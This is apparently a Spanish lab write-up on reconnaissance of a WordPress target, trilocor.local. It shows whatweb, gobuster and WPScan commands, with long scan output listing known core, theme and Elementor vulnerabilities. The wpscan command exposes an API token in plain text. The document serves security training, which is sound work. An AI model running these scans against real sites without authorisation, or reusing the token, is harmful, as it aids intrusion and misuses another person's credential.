
# Enumeración y explotación web

## <mark style="color:purple;">trilocor.local - Web Principal</mark>

<figure><img src="/files/7AVW1RKT7T6VIWG0Isj9" alt=""><figcaption></figcaption></figure>

#### Enumeración de tecnologías

{% code overflow="wrap" %}

```bash
whatweb http://trilocor.local 

http://trilocor.local [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[contact@info.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.101.223], JQuery[3.6.0], MetaGenerator[WordPress 5.8.3], PoweredBy[Trilocor], Script, Title[Trilocor &#8211; A cutting edge robotics company!], WordPress[5.8.3]
```

{% endcode %}

Observamos que es un `Wordpress 5.8.3` sobre `Apache 2.4.41`.

Lo primero que nos llama la atención es que la ruta `wp-admin` no es la ruta de acceso típica, sino que la han modificado, por lo que haremos fuzzing para ver posibles rutas de acceso:

<figure><img src="/files/tPDeRsH67EcnBsTpX5jA" alt=""><figcaption></figcaption></figure>

#### Fuzzing web

```bash
gobuster dir -u http://trilocor.local -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://tricolor.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 251273]
/wp-content/          (Status: 200) [Size: 0]
/wp-content/index.php (Status: 200) [Size: 0]
/wp-content/plugins/  (Status: 200) [Size: 0]
/wp-content/plugins/index.php (Status: 200) [Size: 0]
/wp-content/themes/   (Status: 200) [Size: 0]
/wp-content/themes/index.php (Status: 200) [Size: 0]
/wp-includes/         (Status: 403) [Size: 279]
/wp-includes/css/     (Status: 403) [Size: 279]
/wp-includes/js/      (Status: 403) [Size: 279]
/wp-includes/js/jquery/ (Status: 403) [Size: 279]
/wp-includes/js/jquery/jquery-migrate.min.js (Status: 200) [Size: 11224]
/wp-includes/js/jquery/ui/ (Status: 403) [Size: 279]
/wp-includes/wlwmanifest.xml (Status: 200) [Size: 1045]
Progress: 1578 / 1579 (99.94%)
===============================================================
Finished
===============================================================
```

Parece que no encontramos la url de administración, por lo que seguiremos investigando la web.

#### Enumeración con WP Scan

Usaremos WP Scan con su API gratuíta para hacer una enumeración completa y exhaustiva:

```bash
sudo wpscan --url http://trilocor.local --enumerate --api-token sa9wEcMOko6mOYZwVeOpcbVJWTqa0QUl80NIe1NGONg
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://trilocor.local/ [10.129.101.37]
[+] Started: Tue Dec 16 03:39:50 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress version 5.8.3 identified (Insecure, released on 2022-01-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://trilocor.local/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.8.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://trilocor.local/, Match: 'WordPress 5.8.3'
 |
 | [!] 35 vulnerabilities identified:
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WordPress < 5.9.2 / Gutenberg < 12.7.2 - Prototype Pollution via Gutenberg’s wordpress/url package
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/6e61b246-5af1-4a4f-9ca8-a8c87eb2e499
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |      - https://github.com/WordPress/gutenberg/pull/39365/files
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.8.5
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 5.8.5
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 5.8.5
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 5.8.6
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/
 |
 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection
 |     Fixed in: 5.8.7
 |     References:
 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP 5.6-6.3.1 - Reflected XSS via Application Password Requests
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/da1419cc-d821-42d6-b648-bdb3c70d91f2
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Denial of Service via Cache Poisoning
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/6d80e09d-34d5-4fda-81cb-e703d0e56e4f
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Subscriber+ Arbitrary Shortcode Execution
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/3615aea0-90aa-4f9a-9792-078a90af7f59
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Contributor+ Comment Disclosure
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/d35b2a3d-9b41-4b4f-8e87-1b8ccb370b9f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39999
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WP < 6.3.2 - Unauthenticated Post Author Email Disclosure
 |     Fixed in: 5.8.8
 |     References:
 |      - https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5561
 |      - https://wpscan.com/blog/email-leak-oracle-vulnerability-addressed-in-wordpress-6-3-2/
 |      - https://wordpress.org/news/2023/10/wordpress-6-3-2-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Deserialization of Untrusted Data
 |     Fixed in: 5.8.9
 |     References:
 |      - https://wpscan.com/vulnerability/5e9804e5-bbd4-4836-a5f0-b4388cc39225
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.4.3 - Admin+ PHP File Upload
 |     Fixed in: 5.8.9
 |     References:
 |      - https://wpscan.com/vulnerability/a8e12fbe-c70b-4078-9015-cf57a05bdd4a
 |      - https://wordpress.org/news/2024/01/wordpress-6-4-3-maintenance-and-security-release/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in HTML API
 |     Fixed in: 5.8.10
 |     References:
 |      - https://wpscan.com/vulnerability/2c63f136-4c1f-4093-9a8c-5e51f19eae28
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Stored XSS in Template-Part Block
 |     Fixed in: 5.8.10
 |     References:
 |      - https://wpscan.com/vulnerability/7c448f6d-4531-4757-bff0-be9e3220bbbb
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WordPress < 6.5.5 - Contributor+ Path Traversal in Template-Part Block
 |     Fixed in: 5.8.10
 |     References:
 |      - https://wpscan.com/vulnerability/36232787-754a-4234-83d6-6ded5e80251c
 |      - https://wordpress.org/news/2024/06/wordpress-6-5-5/
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 5.8.12
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 5.8.12
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: astra
 | Location: http://trilocor.local/wp-content/themes/astra/
 | Latest Version: 4.11.17
 | Last Updated: 2025-12-08T00:00:00.000Z
 | Style URL: http://trilocor.local/wp-content/themes/astra/style.css
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Astra < 4.6.9 - Contributor+ Stored XSS
 |     Fixed in: 4.6.9
 |     References:
 |      - https://wpscan.com/vulnerability/62871f3a-c9a8-49bb-b67b-143af3caa986
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2347
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ed914e67-4cf7-49b1-96be-ed8c604e6dce
 |
 | [!] Title: Astra < 4.6.5 - Editor+ Stored XSS via Theme Header/Footer
 |     Fixed in: 4.6.5
 |     References:
 |      - https://wpscan.com/vulnerability/30fd2612-91f6-4c1b-8d0c-fa607edf4717
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-29768
 |      - https://patchstack.com/database/vulnerability/astra/wordpress-astra-theme-4-6-4-cross-site-scripting-xss-vulnerability
 |
 | The version could not be determined.

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] elementor
 | Location: http://trilocor.local/wp-content/plugins/elementor/
 | Last Updated: 2025-12-08T15:39:00.000Z
 | [!] The version is out of date, the latest version is 3.33.4
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 23 vulnerabilities identified:
 |
 | [!] Title: Elementor < 3.5.6 - DOM Reflected Cross-Site Scripting
 |     Fixed in: 3.5.6
 |     References:
 |      - https://wpscan.com/vulnerability/9758570b-4729-4eef-ad52-b6e922f536d6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29455
 |      - https://rotem-bar.com/hacking-65-million-websites-greater-cve-2022-29455-elementor
 |
 | [!] Title: Elementor Website Builder < 3.12.2 - Admin+ SQLi
 |     Fixed in: 3.12.2
 |     References:
 |      - https://wpscan.com/vulnerability/a875836d-77f4-4306-b275-2b60efff1493
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0329
 |
 | [!] Title: Elementor Website Builder < 3.13.2 - Missing Authorization
 |     Fixed in: 3.13.2
 |     Reference: https://wpscan.com/vulnerability/0b68091c-6a05-4f81-a718-6ec139df2e96
 |
 | [!] Title: Elementor < 3.5.5 - Iframe Injection
 |     Fixed in: 3.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/8273357e-f9e1-44bc-8082-8faab838eda7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4953
 |      - https://github.com/elementor/elementor/commit/292fc49e0f979bd52d838f0326d1faaebfa59f5e
 |
 | [!] Title: Elementor Website Builder < 3.16.5 - Authenticated (Contributor+) Stored Cross-Site Scripting via get_inline_svg()
 |     Fixed in: 3.16.5
 |     References:
 |      - https://wpscan.com/vulnerability/62b53acf-6551-4ea7-8727-039a3c9ba7ce
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47505
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b44ef21f-464e-487a-ba5a-fe889e4c488c
 |
 | [!] Title: Elementor Website Builder < 3.16.5 - Missing Authorization to Arbitrary Attachment Read
 |     Fixed in: 3.16.5
 |     References:
 |      - https://wpscan.com/vulnerability/e60f0f7e-4c3b-4107-803a-8e03526859ed
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-47504
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c873c76a-144e-4945-8fa2-c9ffe0e3c061
 |
 | [!] Title: Elementor < 3.18.2 - Contributor+ Arbitrary File Upload to RCE via Template Import
 |     Fixed in: 3.18.2
 |     References:
 |      - https://wpscan.com/vulnerability/a6b3b14c-f06b-4506-9b88-854f155ebca9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-48777
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/5b6d0a38-ac28-41c9-9da1-b30b3657b463
 |
 | [!] Title: Elementor < 3.19.1 - Authenticated(Contributor+) Arbitrary File Deletion and PHAR Deserialization
 |     Fixed in: 3.19.1
 |     References:
 |      - https://wpscan.com/vulnerability/4d7dfcc6-8c32-4e0d-b3bb-7e2685916e2b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-24934
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4915b769-9499-40ac-835e-279e3a910558
 |
 | [!] Title: Elementor Website Builder – More than Just a Page Builder < 3.19.0 - Authenticated (Contributor+) Stored Cross-Site Scripting via get_image_alt
 |     Fixed in: 3.19.0
 |     References:
 |      - https://wpscan.com/vulnerability/57af46d9-9a26-4085-9829-e0add7893332
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0506
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4473d3f6-e324-40f5-b92b-167f76b17332
 |
 | [!] Title: Elementor Website Builder < 3.20.3 - Contributor+ DOM Stored XSS
 |     Fixed in: 3.20.3
 |     References:
 |      - https://wpscan.com/vulnerability/22e8d017-79f5-40c8-8a2c-e0ee42ba80c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2117
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c8d7448a-b8a6-4b0b-92df-a15272fc56bf
 |
 | [!] Title: Elementor Website Builder < 3.21.6 - Contributor+ DOM Stored XSS
 |     Fixed in: 3.21.6
 |     References:
 |      - https://wpscan.com/vulnerability/8b8f30d6-bd11-4155-bfd2-3ac15248382b
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4619
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c7e1028e-e04b-46c4-b574-889d9fc1069d
 |
 | [!] Title: Elementor Website Builder < 3.22.2 - Contributor+ Arbitrary SVG Download
 |     Fixed in: 3.22.2
 |     References:
 |      - https://wpscan.com/vulnerability/e6d56be1-9a2a-426f-88ca-1ffa773622c1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-37437
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f11bc707-2465-4b64-945a-c0db6e9043dd
 |
 | [!] Title: Elementor Website Builder – More than Just a Page Builder < 3.24.0 - Authenticated (Contributor+) Stored Cross-Site Scripting in the URL Parameter in Multiple Widgets
 |     Fixed in: 3.24.0
 |     References:
 |      - https://wpscan.com/vulnerability/5200943b-5e07-4342-a090-f78435e30d30
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5416
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a99a64f7-1ea8-4de6-b24f-1f69bf25c1f5
 |
 | [!] Title: Elementor < 3.24.6 - Contributor+ Information Exposure via get_image_alt
 |     Fixed in: 3.24.6
 |     References:
 |      - https://wpscan.com/vulnerability/dce5ad0c-3ce9-498f-b0f7-8dfd6ee82e40
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6757
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/96fa9ed7-6c13-4356-8a25-8a309be2b0e9
 |
 | [!] Title: Elementor Website Builder < 3.25.8 - Contributor+ Stored XSS
 |     Fixed in: 3.25.8
 |     References:
 |      - https://wpscan.com/vulnerability/78f0847b-3f59-43cf-87db-2cadda862aa3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8236
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b1305be5-8267-475f-b962-62e3930116e1
 |
 | [!] Title: Elementor Website Builder < 3.25.10 - Contributor+ Stored XSS via Typography Settings
 |     Fixed in: 3.25.10
 |     References:
 |      - https://wpscan.com/vulnerability/2e05843d-1797-4da9-99ec-06376484fb32
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-10453
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/f23604b7-5a7f-4be7-bc73-cb4facdd1e73
 |
 | [!] Title: Elementor Website Builder < 3.27.5 - Contributor+ Stored XSS
 |     Fixed in: 3.27.5
 |     References:
 |      - https://wpscan.com/vulnerability/25374232-2f9c-453d-bc47-124f80e67a92
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-13445
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8a11e702-34d2-49ee-8762-cc3614a7950a
 |
 | [!] Title: Elementor Website Builder < 3.25.11 - Contributor+ Stored XSS
 |     Fixed in: 3.25.11
 |     References:
 |      - https://wpscan.com/vulnerability/61e1476a-cb14-46f9-b68c-4fd5b5c39597
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54444
 |      - https://patchstack.com/database/wordpress/plugin/elementor/vulnerability/wordpress-elementor-plugin-3-25-10-cross-site-scripting-xss-vulnerability
 |
 | [!] Title: Elementor Website Builder < 3.29.1 - Contributor+ Stored XSS
 |     Fixed in: 3.29.1
 |     References:
 |      - https://wpscan.com/vulnerability/fc8e4264-fa78-44d2-8b6d-6c4305cd2280
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50555
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/473bef81-b2c9-429c-aa23-c2dba0908cc3
 |
 | [!] Title: Elementor < 3.29.1 - Contributor+ Stored XSS
 |     Fixed in: 3.29.1
 |     References:
 |      - https://wpscan.com/vulnerability/34330a7b-d178-4998-9067-17ae2564cb9a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-3075
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/639693b6-369e-457e-a37e-30bdb8ea7275
 |
 | [!] Title: Elementor < 3.30.3 - Contributor+ Stored XSS via Text Path Widget
 |     Fixed in: 3.30.3
 |     References:
 |      - https://wpscan.com/vulnerability/785a15fe-18ef-4ae2-9143-c625a7a16063
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4566
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/af29ec92-5b07-4f57-a25f-19f3a894a193
 |
 | [!] Title: Elementor < 3.30.3 - Admin+ Arbitrary File Read via Image Import
 |     Fixed in: 3.30.3
 |     References:
 |      - https://wpscan.com/vulnerability/87fd0b78-c0e8-43a8-8b52-bd7a294a96e0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-8081
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/13929b51-b32e-401c-a642-49f7cd2d07bf
 |
 | [!] Title: Elementor Website Builder < 3.33.1 - Missing Authorization
 |     Fixed in: 3.33.1
 |     References:
 |      - https://wpscan.com/vulnerability/ebb1b7b0-cb97-4430-ac6a-e27fe8714b0e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-67588
 |      - https://vdp.patchstack.com/database/Wordpress/Plugin/elementor/vulnerability/wordpress-elementor-website-builder-plugin-3-33-0-broken-access-control-vulnerability
 |
 | Version: 3.5.3 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://trilocor.local/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.5.3
 | Confirmed By:
 |  Javascript Comment (Aggressive Detection)
 |   - http://trilocor.local/wp-content/plugins/elementor/assets/js/admin-feedback.js, Match: 'elementor - v3.5.3'
 |  Style Comment (Aggressive Detection)
 |   - http://trilocor.local/wp-content/plugins/elementor/assets/css/admin.min.css, Match: 'elementor - v3.5.3'

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:05 <=======================================================================================> (652 / 652) 100.00% Time: 00:00:05
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] astra
 | Location: http://trilocor.local/wp-content/themes/astra/
 | Latest Version: 4.11.17
 | Last Updated: 2025-12-08T00:00:00.000Z
 | Style URL: http://trilocor.local/wp-content/themes/astra/style.css
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Astra < 4.6.9 - Contributor+ Stored XSS
 |     Fixed in: 4.6.9
 |     References:
 |      - https://wpscan.com/vulnerability/62871f3a-c9a8-49bb-b67b-143af3caa986
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-2347
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ed914e67-4cf7-49b1-96be-ed8c604e6dce
 |
 | [!] Title: Astra < 4.6.5 - Editor+ Stored XSS via Theme Header/Footer
 |     Fixed in: 4.6.5
 |     References:
 |      - https://wpscan.com/vulnerability/30fd2612-91f6-4c1b-8d0c-fa607edf4717
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-29768
 |      - https://patchstack.com/database/vulnerability/astra/wordpress-astra-theme-4-6-4-cross-site-scripting-xss-vulnerability
 |
 | The version could not be determined.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:21 <=====================================================================================> (2575 / 2575) 100.00% Time: 00:00:21

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <========================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <==============================================================================================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

